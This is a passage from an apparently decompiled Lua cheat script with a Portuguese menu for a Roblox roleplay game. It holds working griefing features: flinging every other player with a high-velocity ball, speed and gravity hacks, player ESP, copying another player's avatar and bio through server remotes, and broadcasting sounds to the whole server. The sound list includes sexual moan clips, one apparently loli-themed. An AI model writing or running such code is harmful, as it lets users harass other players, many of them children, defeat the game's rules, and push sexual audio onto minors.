  tab3:AddButton({
    "Remover Excluídos",
    function()
      if #excludedPlayers == 0 then
        return
      end

      excludedPlayers = {}
    end,
  })

  tab3:AddButton({
    "Bola Fling Orbitando",
    function()
      local character11, humanoidRootPart26

      if orbitando then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        character11 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
        humanoidRootPart26 = character11:FindFirstChild("HumanoidRootPart")

        if not humanoidRootPart26 then
          return
        else
          local workspaceCom3 = workspaceService:FindFirstChild("WorkspaceCom")

          local findFirstChild11 = workspaceCom3
            and workspaceCom3:FindFirstChild("001_SoccerBalls")

          findFirstChild2 = findFirstChild11
            and findFirstChild11:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          end

          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          orbitando = true

          orbitConn = runService.Heartbeat:Connect(function()
            if not orbitando or not findFirstChild2 or not findFirstChild2.Parent
              or not humanoidRootPart26 or not humanoidRootPart26.Parent or not character11
              or not character11.Parent then
              if orbitConn then
                orbitConn:Disconnect()
                orbitConn = nil
              end

              orbitando = false

              if findFirstChild2 and v6 then
                findFirstChild2.Anchored = v6.Anchored
                findFirstChild2.CanCollide = v6.CanCollide
                findFirstChild2.CanTouch = v6.CanTouch
              end

              findFirstChild2 = nil
              v6 = nil
              return
            else
              local v104 = tick() * 10
              local v105 = math.cos(v104)
              local v106 = math.sin(v104)
              local vector6 = Vector3.new(v105 * 3, -1, v106 * 3)

              findFirstChild2.CFrame = CFrame.new(humanoidRootPart26.Position + vector6)
              findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)

              return
            end
          end)

          return
        end
      end
    end,
  })

  tab3:AddButton({
    "Fling Bola ALL V1",
    function()
      local f32, v107

      if allFling then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v107 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v107))
        end)

        local workspaceCom4 = workspaceService:FindFirstChild("WorkspaceCom")

        local findFirstChild12 = workspaceCom4
          and workspaceCom4:FindFirstChild("001_SoccerBalls")

        findFirstChild2 = findFirstChild12
          and findFirstChild12:FindFirstChild("Soccer" .. localPlayer2.Name)

        if not findFirstChild2 then
          return
        end

        v6 = {
          Anchored = findFirstChild2.Anchored,
          CanCollide = findFirstChild2.CanCollide,
          CanTouch = findFirstChild2.CanTouch,
        }

        findFirstChild2.Anchored = false
        findFirstChild2.CanCollide = true
        findFirstChild2.CanTouch = true

        pcall(function() findFirstChild2:SetNetworkOwner(nil) end)

        function f32()
          local v108 = {}

          for index43, value51 in ipairs(players:GetPlayers()) do
            local v109 = false

            for index44, value52 in ipairs(excludedPlayers) do
              if value51 == value52 then
                v109 = true
                break
              end
            end

            if value51 ~= localPlayer2 and not v109 and value51.Character
              and value51.Character:FindFirstChild("HumanoidRootPart") then
              table.insert(v108, value51)
            end
          end

          local v110 = #v108 - -1

          while true do
            v110 = -1 + v110

            if not (v110 >= 2 or false) then
              break
            end

            local v111 = v110
            local v112 = math.random(v111)
            local v113 = v108[v111]

            v108[v111] = v108[v112]
            v108[v112] = v113
          end

          return v108
        end

        allFling = true

        allConn = runService.Heartbeat:Connect(function()
          if not allFling or not findFirstChild2 or not findFirstChild2.Parent then
            if allConn then
              allConn:Disconnect()
              allConn = nil
            end

            allFling = false

            if findFirstChild2 and v6 then
              findFirstChild2.Anchored = v6.Anchored
              findFirstChild2.CanCollide = v6.CanCollide
              findFirstChild2.CanTouch = v6.CanTouch
            end

            findFirstChild2 = nil
            v6 = nil
            currentPlayerList = nil
            currentPlayerIndex = nil
            lastSwitchTime = nil
            return
          end

          if not currentPlayerList or #currentPlayerList == 0 then
            currentPlayerList = f32()
            currentPlayerIndex = 1
            lastSwitchTime = tick()
          end

          local vector7, bodyVelocity6

          if #currentPlayerList == 0 then
            return
          else
            if tick() - lastSwitchTime >= 4 then
              currentPlayerIndex = currentPlayerIndex + 1

              if currentPlayerIndex > #currentPlayerList then
                currentPlayerList = f32()
                currentPlayerIndex = 1
              end

              lastSwitchTime = tick()
            end

            local v114 = currentPlayerList[currentPlayerIndex]

            if not v114 or not v114.Character then
              return
            else
              local character12 = v114.Character

              if character12 and character12:FindFirstChild("HumanoidRootPart")
                and character12:FindFirstChild("Humanoid") then
                local humanoidRootPart27 = character12.HumanoidRootPart
                local humanoid21 = character12.Humanoid
                local magnitude2 = humanoidRootPart27.Velocity.Magnitude
                local v115 = humanoid21:GetState() == Enum.HumanoidStateType.Jumping

                if humanoid21.MoveDirection.Magnitude > 0.05 or v115 then
                  vector7 = humanoidRootPart27.CFrame.LookVector
                      * math.clamp(magnitude2 / 1.5, 6, 18)
                    + Vector3.new(0, 1, 0)
                else
                  local v116 = tick()
                  local v117 = math.sin(v116 * 25)
                  local v118 = tick()
                  local v119 = math.cos(v118 * 20)
                  vector7 = Vector3.new(v119 * 1.5, 1, v117 * 4)
                end

                findFirstChild2.CFrame = CFrame.new(humanoidRootPart27.Position + vector7)
                findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)

                if (findFirstChild2.Position - humanoidRootPart27.Position).Magnitude < 4 then
                  bodyVelocity6 = Instance.new("BodyVelocity")
                  bodyVelocity6.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                  bodyVelocity6.Velocity = Vector3.new(
                    math.random(-5, 5), 5, math.random(-5, 5)
                  ).Unit * 500000 + Vector3.new(0, 250000, 0)

                  bodyVelocity6.Parent = humanoidRootPart27

                  task.delay(0.3, function() bodyVelocity6:Destroy() end)
                end
              end

              return
            end
          end
        end)

        return
      end
    end,
  })

  tab3:AddButton({
    "Fling Bola ALL V2",
    function()
      local v120

      if allFling2 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v120 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v120))
        end)

        local workspaceCom5 = workspaceService:FindFirstChild("WorkspaceCom")

        local findFirstChild13 = workspaceCom5
          and workspaceCom5:FindFirstChild("001_SoccerBalls")

        findFirstChild2 = findFirstChild13
          and findFirstChild13:FindFirstChild("Soccer" .. localPlayer2.Name)

        if not findFirstChild2 then
          return
        end

        v6 = {
          Anchored = findFirstChild2.Anchored,
          CanCollide = findFirstChild2.CanCollide,
          CanTouch = findFirstChild2.CanTouch,
        }

        findFirstChild2.Anchored = false
        findFirstChild2.CanCollide = true
        findFirstChild2.CanTouch = true

        pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
        allFling2 = true

        allConn2 = runService.Heartbeat:Connect(function()
          local v121 = not allFling2 or not findFirstChild2 or not findFirstChild2.Parent
          local vector8

          if v121 then
            if allConn2 then
              allConn2:Disconnect()
              allConn2 = nil
            end

            allFling2 = false

            if findFirstChild2 and v6 then
              findFirstChild2.Anchored = v6.Anchored
              findFirstChild2.CanCollide = v6.CanCollide
              findFirstChild2.CanTouch = v6.CanTouch
            end

            findFirstChild2 = nil
            v6 = nil
            return
          else
            local v122 = {}

            for index45, value53 in ipairs(players:GetPlayers()) do
              local v123 = false

              for index46, value54 in ipairs(excludedPlayers) do
                if value53 == value54 then
                  v123 = true
                  break
                end
              end

              if value53 ~= localPlayer2 and not v123 and value53.Character
                and value53.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(v122, value53)
              end
            end

            local v124 = #v122 - -1

            while true do
              v124 = -1 + v124

              if not (v124 >= 2 or false) then
                break
              end

              local v125 = v124
              local v126 = math.random(v125)
              local v127 = v122[v125]

              v122[v125] = v122[v126]
              v122[v126] = v127
            end

            for index47, value55 in ipairs(v122) do
              if not allFling2 then
                break
              else
                local character13 = value55.Character

                if character13 and character13:FindFirstChild("HumanoidRootPart")
                  and character13:FindFirstChild("Humanoid") then
                  local humanoidRootPart28 = character13.HumanoidRootPart
                  local humanoid22 = character13.Humanoid
                  local magnitude3 = humanoidRootPart28.Velocity.Magnitude
                  local v128 = humanoid22:GetState() == Enum.HumanoidStateType.Jumping

                  if humanoid22.MoveDirection.Magnitude > 0.05 or v128 then
                    vector8 = humanoidRootPart28.CFrame.LookVector
                        * math.clamp(magnitude3 / 1.5, 6, 18)
                      + Vector3.new(0, 1, 0)
                  else
                    local v129 = tick()
                    local v130 = math.sin(v129 * 25)
                    local v131 = tick()
                    local v132 = math.cos(v131 * 20)
                    vector8 = Vector3.new(v132 * 1.5, 1, v130 * 4)
                  end

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart28.Position + vector8)
                  findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)

                  if (findFirstChild2.Position - humanoidRootPart28.Position).Magnitude < 4 then
                    local bodyVelocity7 = Instance.new("BodyVelocity")
                    bodyVelocity7.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    bodyVelocity7.Velocity = Vector3.new(
                      math.random(-5, 5), 5, math.random(-5, 5)
                    ).Unit * 1000000 + Vector3.new(0, 1000000, 0)

                    bodyVelocity7.Parent = humanoidRootPart28

                    task.delay(0.3, function() bodyVelocity7:Destroy() end)
                  end
                end

                task.wait(0.1)
              end
            end

            return
          end
        end)

        return
      end
    end,
  })

  tab3:AddButton({
    "Parar Tudo",
    function()
      orbitando = false

      if orbitConn then
        orbitConn:Disconnect()
        orbitConn = nil
      end

      allFling = false

      if allConn then
        allConn:Disconnect()
        allConn = nil
      end

      currentPlayerList = nil
      currentPlayerIndex = nil
      lastSwitchTime = nil
      allFling2 = false

      if allConn2 then
        allConn2:Disconnect()
        allConn2 = nil
      end

      if findFirstChild2 and v6 then
        findFirstChild2.Anchored = v6.Anchored
        findFirstChild2.CanCollide = v6.CanCollide
        findFirstChild2.CanTouch = v6.CanTouch
      end

      findFirstChild2 = nil
      v6 = nil
    end,
  })

  tab4:AddSection({ "função" })

  tab4:AddSlider({
    Name = "Velocidade (Speed)",
    Min = 16,
    Max = 1000,
    Default = 16,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "SpeedSlider",
    Callback = function(value56)
      local localPlayer6 = players.LocalPlayer

      if localPlayer6.Character and localPlayer6.Character:FindFirstChild("Humanoid") then
        localPlayer6.Character.Humanoid.WalkSpeed = value56
      end
    end,
  })

  tab4:AddSlider({
    Name = "Pulo (JumpPower)",
    Min = 50,
    Max = 500,
    Default = 50,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "JumpSlider",
    Callback = function(value57)
      local localPlayer7 = players.LocalPlayer

      if localPlayer7.Character and localPlayer7.Character:FindFirstChild("Humanoid") then
        localPlayer7.Character.Humanoid.UseJumpPower = true
        localPlayer7.Character.Humanoid.JumpPower = value57
      end
    end,
  })

  _G.InfJump = false

  tab4:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(value58)
      _G.InfJump = value58

      userInputService.JumpRequest:Connect(function()
        if _G.InfJump then
          local localPlayer8 = players.LocalPlayer

          if localPlayer8.Character and localPlayer8.Character:FindFirstChildOfClass("Humanoid") then
            localPlayer8.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
          end
        end
      end)
    end,
  })

  tab4:AddSlider({
    Name = "Gravidade",
    Min = 0,
    Max = 196.2,
    Default = 196.2,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "GravitySlider",
    Callback = function(value59) workspace.Gravity = value59 end,
  })

  tab4:AddSection({ "Visuais / ESP" })

  _G.EspRgb = false
  connect4 = nil

  tab4:AddToggle({
    Name = "ESP Jogadores (RGB)",
    Default = false,
    Callback = function(value60)
      _G.EspRgb = value60
      local localPlayer9 = players.LocalPlayer

      if _G.EspRgb then
        connect4 = runService.RenderStepped:Connect(function()
          local v133 = tick()
          local color = Color3.fromHSV(v133 % 5 / 5, 1, 1)

          for index48, value61 in ipairs(players:GetPlayers()) do
            if value61 ~= localPlayer9 and value61.Character then
              local espHighlight = value61.Character:FindFirstChild("EspHighlight")

              if not espHighlight then
                espHighlight = Instance.new("Highlight")
                espHighlight.Name = "EspHighlight"
                espHighlight.Adornee = value61.Character
                espHighlight.Parent = value61.Character
              end

              espHighlight.FillColor = color
              espHighlight.OutlineColor = Color3.new(1, 1, 1)
            end
          end
        end)
      else
        if connect4 then
          connect4:Disconnect()
          connect4 = nil
        end

        for index49, value62 in ipairs(players:GetPlayers()) do
          if value62.Character then
            local espHighlight2 = value62.Character:FindFirstChild("EspHighlight")

            if espHighlight2 then
              espHighlight2:Destroy()
            end
          end
        end
      end
    end,
  })

  tab5:AddSection({ "avatares" })
  localPlayer3 = players.LocalPlayer
  remotes = replicatedStorage:WaitForChild("Remotes")

  function f16()
    local v134 = {}

    for index50, value63 in ipairs(players:GetPlayers()) do
      if value63.Name ~= localPlayer3.Name then
        table.insert(v134, value63.Name)
      end
    end

    return v134
  end

  v12 = nil

  playersListAddDropdown = tab5:AddDropdown({
    Name = "Players List",
    Description = "",
    Options = f16(),
    Default = "",
    Flag = "player list",
    Callback = function(value64) v12 = value64 end,
  })

  function f23()
    playersListAddDropdown:Set(f16())
  end

  f23()

  tab5:AddButton({ "Atualizar lista", function() f23() end })

  players.PlayerAdded:Connect(f23)
  players.PlayerRemoving:Connect(f23)

  tab5:AddButton({
    Name = "Copy Avatar",
    Callback = function()
      if not v12 then
        return
      else
        local character14 = players.LocalPlayer.Character
        local findFirstChild14 = players:FindFirstChild(v12)

        if findFirstChild14 and findFirstChild14.Character then
          local humanoid23 = character14 and character14:FindFirstChildOfClass("Humanoid")
          local humanoid24 = findFirstChild14.Character:FindFirstChildOfClass("Humanoid")

          if humanoid23 and humanoid24 then
            local getAppliedDescription = humanoid23:GetAppliedDescription()

            for index51, value65 in ipairs(getAppliedDescription:GetAccessories(true)) do
              if value65.AssetId and tonumber(value65.AssetId) then
                remotes.Wear:InvokeServer(tonumber(value65.AssetId))
                task.wait(0.2)
              end
            end

            if tonumber(getAppliedDescription.Shirt) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Shirt))
              task.wait(0.2)
            end

            if tonumber(getAppliedDescription.Pants) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Pants))
              task.wait(0.2)
            end

            if tonumber(getAppliedDescription.Face) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Face))
              task.wait(0.2)
            end

            local getAppliedDescription2 = humanoid24:GetAppliedDescription()

            remotes.ChangeCharacterBody:InvokeServer(unpack({
              {
                getAppliedDescription2.Torso, getAppliedDescription2.RightArm,
                getAppliedDescription2.LeftArm, getAppliedDescription2.RightLeg,
                getAppliedDescription2.LeftLeg, getAppliedDescription2.Head,
              },
            }))

            task.wait(0.5)

            if tonumber(getAppliedDescription2.Shirt) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Shirt))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.Pants) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Pants))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.Face) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Face))
              task.wait(0.3)
            end

            for index52, value66 in ipairs(getAppliedDescription2:GetAccessories(true)) do
              if value66.AssetId and tonumber(value66.AssetId) then
                remotes.Wear:InvokeServer(tonumber(value66.AssetId))
                task.wait(0.3)
              end
            end

            local bodyColors = findFirstChild14.Character:FindFirstChild("Body Colors")

            if bodyColors then
              remotes.ChangeBodyColor:FireServer(tostring(bodyColors.HeadColor))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.IdleAnimation) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.IdleAnimation))
              task.wait(0.3)
            end

            local playersBag = findFirstChild14:FindFirstChild("PlayersBag")

            if playersBag then
              if playersBag:FindFirstChild("RPName") and playersBag.RPName.Value ~= "" then
                remotes.RPNameText:FireServer("RolePlayName", playersBag.RPName.Value)
                task.wait(0.3)
              end

              if playersBag:FindFirstChild("RPBio") and playersBag.RPBio.Value ~= "" then
                remotes.RPNameText:FireServer("RolePlayBio", playersBag.RPBio.Value)
                task.wait(0.3)
              end

              if playersBag:FindFirstChild("RPNameColor") then
                remotes.RPNameColor:FireServer(
                  "PickingRPNameColor", playersBag.RPNameColor.Value
                )

                task.wait(0.3)
              end

              if playersBag:FindFirstChild("RPBioColor") then
                remotes.RPNameColor:FireServer("PickingRPBioColor", playersBag.RPBioColor.Value)
                task.wait(0.3)
              end
            end
          end
        end

        return
      end
    end,
  })

  tab5:AddSection({ "Roupas 3D" })

  v13 = {}
  v13.ReplicatedStorage = replicatedStorage

  function v13:MostrarNotificacao(text)
    pcall(function()
      starterGui:SetCore("SendNotification", { Title = "Aviso", Text = text, Duration = 5 })
    end)
  end

  v13.Avatares = {
    { Nome = "Gato de Manga", ID = 124948425515120 },
    { Nome = "Tung Saur", ID = 117098257036480 }, { Nome = "Tralaleiro", ID = 99459753608381 },
    { Nome = "Monstro S.A", ID = 123609977175230 }, { Nome = "Trenzinho", ID = 80468697076178 },
    { Nome = "Dino", ID = 11941741105 }, { Nome = "Pou idoso", ID = 15742966010 },
    { Nome = "Coco/boxt@", ID = 77013984520332 }, { Nome = "Coelho", ID = 71797333686800 },
    { Nome = "Hipopótamo", ID = 73215892129281 }, { Nome = "Ratatui", ID = 108557570415450 },
    { Nome = "Galinha", ID = 71251793812515 }, { Nome = "Pepa pig", ID = 92979204778377 },
    { Nome = "pinguin", ID = 94944293759578 }, { Nome = "Sid", ID = 87442757321244 },
    { Nome = "puga grande", ID = 111436158728716 },
    { Nome = "SHREK AMALDIÇOADO", ID = 120960401202170 },
    { Nome = "mosquito grande", ID = 108052868536440 },
    { Nome = "Noob Invertido", ID = 106596990206151 },
    { Nome = "Pato(a)", ID = 135132836238350 },
    { Nome = "Cachorro Chihuahua", ID = 18656467256 }, { Nome = "Gato sla", ID = 18994959003 },
    { Nome = "Gato fei ", ID = 77506186615650 }, { Nome = "Inpostor", ID = 18234669337 },
    { Nome = "Simon amarelo", ID = 75183593514657 },
    { Nome = "Simon azul", ID = 76155710249925 },
  }

  function v13:GetAvatarNames()
    local v135 = {}

    for index53, value67 in ipairs(self.Avatares) do
      table.insert(v135, value67.Nome)
    end

    return v135
  end

  function v13:EquiparAvatar(p19)
    local v136

    for index54, value68 in ipairs(self.Avatares) do
      if value68.Nome == p19 then
        v136 = { value68.ID }

        if pcall(function()
          return self.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(v136))
        end) then
          self:MostrarNotificacao("Avatar " .. p19 .. " equipado com sucesso!")
        else
          self:MostrarNotificacao("Falha ao equipar o avatar " .. p19 .. "!")
        end

        return
      end
    end

    self:MostrarNotificacao("Avatar " .. p19 .. " não encontrado!")
  end

  tab5:AddDropdown({
    Name = "assesorios 3D",
    Description = "Selecione para equipar",
    Default = nil,
    Options = v13:GetAvatarNames(),
    Callback = function(value69) _G.SelectedAvatar = value69 end,
  })

  tab5:AddButton({
    Name = "equipar",
    Description = "Equipar selecionado",
    Callback = function()
      if not _G.SelectedAvatar or _G.SelectedAvatar == "" then
        v13:MostrarNotificacao("Nenhum avatar selecionado!")
        return
      end

      v13:EquiparAvatar(_G.SelectedAvatar)
    end,
  })

  tab5:AddSection({ "Avatar Editor" })
  tab5:AddParagraph({ Title = "aviso vai resetar seu avatar", Content = "" })

  tab5:AddButton({
    Name = "Mini REPO",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        117101023704820, 125767940563840, 137301494386930, 87357384184710, 133391239416999,
        111818794467820,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  tab5:AddButton({
    Name = "mini garanhao",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        124355047456540, 120507500641960, 82273782655463, 113625313757230, 109182039511426, 0,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  tab5:AddButton({
    Name = "stick",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        14731384498, 14731377938, 14731377894, 14731377875, 14731377941, 14731382899,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  tab5:AddButton({
    Name = "Chunky-Bug",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        15527827600, 15527827578, 15527831669, 15527836067, 15527827184, 15527827599,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  tab5:AddButton({
    Name = "Cursed-Spider",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        134555168634910, 100269043793774, 125607053187320, 122504853343600, 95907982259204,
        91289185840375,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  tab5:AddButton({
    Name = "Possessed-Horror",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        122800511983370, 132465361516275, 125155800236527, 83070163355072, 102906187256945,
        78311422507297,
      })

      print("Todas as partes do corpo equipadas!")
    end,
  })

  localPlayer4 = players.LocalPlayer
  replicatedStorage:WaitForChild("Remotes")
  tab6:AddSection({ "RGBs" })

  _G.RGBSkin = false
  _G.RGBHair = false

  tab6:AddToggle({
    Name = "RGB Skin",
    Default = false,
    Callback = function(value70)
      _G.RGBSkin = value70

      task.spawn(function()
        while _G.RGBSkin do
          local v137 = tick()
          Color3.fromHSV(v137 % 5 / 5, 1, 1)
          task.wait(0.1)
        end
      end)
    end,
  })

  tab6:AddToggle({
    Name = "Cabelo RGB",
    Default = false,
    Callback = function(value71)
      _G.RGBHair = value71

      task.spawn(function()
        while _G.RGBHair do
          local v138 = tick()
          local color2 = Color3.fromHSV(v138 % 5 / 5, 1, 1)

          pcall(function()
            local character15 = localPlayer4.Character

            if character15 then
              for index55, value72 in ipairs(character15:GetChildren()) do
                if value72:IsA("Accessory") then
                  local handle = value72:FindFirstChild("Handle")

                  if handle then
                    for index56, value73 in ipairs(handle:GetChildren()) do
                      if value73:IsA("SpecialMesh") or value73:IsA("MeshPart") then
                        value73.VertexColor = Vector3.new(color2.R, color2.G, color2.B)
                      end
                    end
                  end
                end
              end
            end
          end)

          task.wait(0.1)
        end
      end)
    end,
  })

  tab6:AddSection({ "Informações" })

  tab6:AddParagraph({
    Title = "vai ter mais coisas na atualização",
    Content = "Vai ter mais coisas na próxima atualização!",
  })

  v14 = false
  v15 = ""

  tab:AddTextBox({
    Name = "Insira o ID Audio All",
    Description = "Digite o ID do som que deseja tocar",
    Default = "",
    PlaceholderText = "Exemplo: 6832470734",
    ClearTextOnFocus = true,
    Callback = function(value74) v15 = tonumber(value74) end,
  })

  function f24(p20, p21)
    local findFirstChild15 = replicatedStorage:FindFirstChild("RE")
      and replicatedStorage.RE:FindFirstChild(p20)

    if findFirstChild15 then
      pcall(function() findFirstChild15:FireServer(unpack(p21)) end)
    end
  end

  tab:AddButton({
    Name = "Tocar Som",
    Description = "Clique para tocar a música inserida",
    Callback = function()
      if v15 then
        f24("1Gu1nSound1s", { workspaceService, v15, 1 })

        local instance = Instance.new("Sound", workspaceService)
        instance.SoundId = "rbxassetid://" .. v15
        instance.Looped = false
        instance:Play()

        task.wait(3)
        instance:Destroy()
      end
    end,
  })

  tab:AddToggle({
    Name = "Loop",
    Description = "Ative para colocar o som em loop",
    Default = false,
    Callback = function(value75)
      v14 = value75

      if v14 then
        spawn(function()
          while v14 do
            if v15 then
              f24("1Gu1nSound1s", { workspaceService, v15, 1 })

              local instance2 = Instance.new("Sound", workspaceService)
              instance2.SoundId = "rbxassetid://" .. v15
              instance2.Looped = false
              instance2:Play()

              task.spawn(function()
                task.wait(3)
                instance2:Destroy()
              end)
            end

            task.wait(1)
          end
        end)
      end
    end,
  })

  local function makeSound(name3, p22, default)
    local v139 = {}
    local v140 = {}

    for key, value76 in pairs(p22) do
      for index57, value77 in ipairs(value76) do
        if value77.name ~= "" and value77.id ~= "4354908569" then
          table.insert(v139, value77.name)
          v140[value77.name] = { id = value77.id, category = key }
        end
      end
    end

    local function makeSound2(id, p23, pitch)
      f24("1Gu1nSound1s", { workspaceService, id, p23 })

      local sound = Instance.new("Sound")
      sound.Parent = workspaceService
      sound.SoundId = "rbxassetid://" .. id
      sound.Volume = p23
      sound.Pitch = pitch
      sound.Looped = false
      sound:Play()

      task.spawn(function()
        task.wait(3)
        sound:Destroy()
      end)
    end

    local id2

    tab:AddDropdown({
      Name = name3,
      Description = "Escolha um som para tocar no servidor",
      Default = default,
      Multi = false,
      Options = v139,
      Callback = function(value78)
        if value78 and v140[value78] then
          id2 = v140[value78].id
        else
          id2 = nil
        end
      end,
    })

    tab:AddButton({
      Name = "Tocar Som Selecionado",
      Description = "Clique para tocar o som do dropdown",
      Callback = function()
        if id2 then
          makeSound2(id2, 1, 1)
        end
      end,
    })

    local loop = false

    tab:AddToggle({
      Name = "Loop",
      Description = "Ativa o loop do som selecionado",
      Default = false,
      Callback = function(value79)
        loop = value79

        if value79 then
          task.spawn(function()
            while loop do
              if id2 then
                makeSound2(id2, 1, 1)
              end

              task.wait(1)
            end
          end)
        end
      end,
    })
  end

  makeSound("Selecione um meme", {
    Memes = {
      { name = "pankapakan", id = "122547522269143" },
      { name = "Gemido ultra rápido", id = "128863565301778" },
      { name = "vai g0z@?", id = "116293771329297" },
      { name = "G0z33iiii", id = "93462644278510" },
      { name = "Hommmm ", id = "133135656929513" },
      { name = "gemido1", id = "105263704862377" },
      { name = " gemido2", id = "92186909873950" },
      { name = "sus sex", id = "128137573022197" },
      { name = "gemido estranho", id = "131219411501419" },
      { name = "gemido kawai", id = "100409245129170" },
      { name = "Hentai wiaaaaan", id = "88332347208779" },
      { name = "iamete cunasai", id = "108494476595033" },
      { name = "dodichan onnn...", id = "134640594695384" },
      { name = "Loly gemiD0", id = "119277017538197" },
      { name = "ai poison", id = "115870718113313" },
      { name = "chegachega SUS", id = "77405864184828" },
      { name = "uwu", id = "76820720070248" },
      { name = "ai meu cuzin", id = "130714479795369" },
      { name = "girl audio 2", id = "84207358477461" },
      { name = "Hoo ze da manga", id = "106624090319571" },
      { name = "ai alexandre de moraes", id = "107261471941570" },
      { name = "haaii meme", id = "120006672159037" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" },
      { name = "GoGogo gogogo", id = "103262503950995" },
      { name = "Toma jack", id = "132603645477541" },
      { name = "Toma jackV2", id = "100446887985203" },
      { name = "Toma jack no sol quente", id = "97476487963273" },
      { name = "ifood", id = "133843750864059" },
      { name = "pelo geito ela ta querendo ram", id = "94395705857835" },
      { name = "lula vai todo mundo", id = "136804576009416" },
      { name = "coringa", id = "84663543883498" }, { name = "shoope", id = "8747441609" },
      { name = "quenojo", id = "103440368630269" },
      { name = "sai dai lava prato", id = "101232400175829" },
      { name = "se e loko numconpeça", id = "78442476709262" },
      { name = "mita sequer que eu too uma", id = "94889439372168" },
      { name = "Hoje vou ser tua mulher e tu", id = "90844637105538" },
      { name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582" },
      { name = "miau", id = "131804436682424" }, { name = "skibidi", id = "128771670035179" },
      { name = "BIRULEIBI", id = "121569761604968" },
      { name = "biseabesjnjkasnakjsndjkafb", id = "133106998846260" },
      { name = "vai corinthians!!....", id = "127012936767471" },
      { name = "my sigman", id = "103431815659907" }, { name = "mama", id = "106850066985594" },
      { name = "OH MY GOD", id = "73349649774476" },
      { name = "aahhh plankton meme", id = "95982351322190" },
      { name = "CHINABOY", id = "84403553163931" },
      { name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS", id = "71153532555470" },
      { name = "Sai d3sgraç@", id = "106973692977609" },
      { name = "opa salve tudo bem?", id = "80870678096428" },
      { name = "OLHA O CARRO DO DANONE", id = "110493863773948" },
      { name = "Nãooooo, Nãooooo, Nãooo!!!!!", id = "95825536480898" },
      { name = "UM PÉ DE SIRIGUELA KK", id = "112804043442210" },
      { name = "e o carro da pamonha", id = "94951629392683" },
      { name = "BOM DIAAAAAAAAAA", id = "136579844511260" },
      { name = "ai-meu-chiclete", id = "92911732806153" },
      { name = "posso te ligar ou tua mulher...", id = "103211341252816" },
      { name = "Boa chi joga muito cara", id = "110707564387669" },
      { name = "Oqueee meme", id = "120092799810101" },
      { name = "kkk muito fei", id = "79241074803021" },
      { name = "lula cade o ze gotinha", id = "86012585992725" },
      { name = "morreu", id = "8872409975" },
      { name = "a-pia-ta-cheia-de-louca", id = "98076927129047" },
      { name = "Mahito killSong", id = "128669424001766" },
      { name = "Sucumba", id = "7946300950" },
      { name = "nem clicou o thurzin", id = "84428355313544" },
      { name = "fiui OLHA MENSAGEM", id = "121668429878811" },
      { name = "tooomeee", id = "128319664118768" },
      { name = "risada de ladrao", id = "133065882609605" },
      { name = "E o PIX nada ainda", id = "113831443375212" },
      { name = "Vo nada vo nada", id = "89093085290586" },
      { name = "Eli gosta", id = "105012436535315" },
      { name = "um cavalo de tres pernas?", id = "8164241439" },
      { name = "voces sao um bado de fdp", id = "8232773326" },
